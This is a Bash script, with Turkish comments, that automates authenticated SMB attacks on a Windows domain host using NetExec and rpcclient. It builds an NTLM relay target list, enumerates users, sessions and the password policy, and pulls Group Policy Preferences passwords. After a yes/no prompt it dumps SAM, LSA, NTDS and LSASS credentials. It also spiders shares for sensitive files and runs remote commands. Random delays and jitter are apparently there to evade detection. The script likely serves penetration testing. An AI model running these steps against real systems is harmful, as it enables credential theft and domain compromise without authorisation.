#!/bin/bash


while getopts ":d:i:u:p:" o; do
	case "${o}" in
		d) domain_address=${OPTARG} ;;
		i) ip=${OPTARG} ;;
		u) username=${OPTARG} ;;
		p) password=${OPTARG} ;;
		*) usage; exit 1 ;;
	esac
done
 
if [ -z "${domain_address}" ] || [ -z "${ip}" ] || [ -z "${username}" ] || [ -z "${password}" ]; then
	echo -e "$RED Hata: Eksik parametre girdiniz!$ENDCOLOR"
	usage
	exit 1
fi

random_delay() {
    # Gaussian-like distribution için 3 random değer ortalaması
    local r1=$((RANDOM % 21 + 10))  # 10-30
    local r2=$((RANDOM % 21 + 10))
    local r3=$((RANDOM % 21 + 10))
    local delay=$(( (r1 + r2 + r3) / 3 ))
    
    # Küçük jitter ekle (-2 ila +2 saniye)
    local jitter=$((RANDOM % 5 - 2))
    delay=$((delay + jitter))
    
    # Sınırları koru
    [ $delay -lt 10 ] && delay=10
    [ $delay -gt 30 ] && delay=30
    
    echo "$delay"
    sleep $delay
}

smb_enumerate(){

	mkdir -p ./smbdata/
	echo -e "\nSMB Enumeration"
	echo "Domain Address: $domain_address"
	echo "IP Address:     $ip"
	echo "Username:       $username"
	echo "===================================="

	#smb gen relay
	local subnet=$(echo "$ip" | awk -F'.' '{print $1"."$2"."$3".0/24"}')
	echo -e "\nSMB gen relay: $subnet"   # çıktı: 192.168.1.0/24
	nxc smb "$subnet" --gen-relay-list ./smbdata/relaylist.txt

	random_delay
	#interfaces
	echo -e "\nSMB interfaces"
	nxc smb $ip -u "$username" -p "$password" -M enum_interfaces --log ./smbdata/interfaces.txt --jitter 3592

	random_delay
	#smb sessions
	echo -e "\nSMB sessions"
	nxc smb $ip -u "$username" -p "$password" --loggedon-users --reg-sessions --qwinsta --log ./smbdata/smbsessions.txt --jitter 2605

	random_delay
	#smb users & groups
	echo -e "\nSMB users and groups"
	[ ! -s "./ldap_dump/users.txt" ] && rpcclient -U "${domain_address}/${username}%${password}" ${ip} -c "enumdomusers" > ./smbdata/userandgroups.txt 
	[ ! -s "./ldap_dump/groups.txt" ] && rpcclient -U "${domain_address}/${username}%${password}" ${ip} -c "enumdomgroups" ./smbdata/userandgroups.txt
	[ -s "./ldap_dump/users.txt" ] && echo "./ldap_dump/users.txt file found (skipped)"
	[ -s "./ldap_dump/groups.txt" ] && echo "./ldap_dump/groups.txt file found (skipped)"

	random_delay
	#smb password policy
	echo -e "\nSMB password policy"
	nxc smb $ip -u "$username" -p "$password" --pass-pol --log ./smbdata/passpol.txt --jitter 2514

	random_delay
	#smb gpo enumeration
	echo -e "\nSMB GPP Enumeration"
	nxc smb "$ip" -u "$username" -p "$password" -M gpp_autologin -M gpp_password -M gpp_privileges --log ./smbdata/gppout.txt --jitter 1604

	random_delay
	#smb dumping credentials
	echo -e "\nSMB credentials dumping"
	read -p "Dump credentials? (y/N): " confirm
	if [ "$confirm" = "y" ]; then
		nxc smb $ip -u "$username" -p "$password" --sam --log ./smbdata/dump.txt --jitter 1792 # sam database dump edilir.
		nxc smb $ip -u "$username" -p "$password" --lsa --log ./smbdata/dump.txt --jitter 3658 # lsa dump edilir.
		nxc smb $ip -u "$username" -p "$password" --ntds --log ./smbdata/dump.txt --jitter 2735 # ntds dump edilir.
		nxc smb $ip -u "$username" -p "$password" -M lsassy --log ./smbdata/dump.txt --jitter 1537 # lsass dump edilir.
	else
		echo "Skipped."
	fi

	random_delay
	#smb shares
	echo -e "\nSMB shares - (config|ini|xml|txt|pdf|csv|bak|backup|php|cfg|conf|json|js|sql|db|zip|tar|gz)"
	nxc smb "$ip" -u "$username" -p "$password" --shares --jitter 3572 | grep "READ" | awk '{print $5}' | grep -ivE '^(C\$|IPC\$|ADMIN\$|NETLOGON|SYSVOL)[[:space:]]*$' > ./smbdata/sharesname.txt

	[ -s "./smbdata/sharesname.txt" ] && while IFS= read -r share_name; do
		echo "Spidering: $share_name"
		nxc smb "$ip" -u "$username" -p "$password"  --jitter 2578 --spider "$share_name" --content --regex '\.(config|ini|xml|txt|pdf|csv|bak|backup|php|cfg|conf|json|js|sql|db|zip|tar|gz)$'
	done < ./smbdata/sharesname.txt

	random_delay
	#command execute
	echo -e "\nSMB command executing"
	read -p "Execute command (whoami)? (y/N): " confirm
	if [ "$confirm" = "y" ]; then
		nxc smb $ip -u "$username" -p "$password" -x whoami --jitter 2612
	else
		echo "Skipped"
	fi

}

smb_enumerate
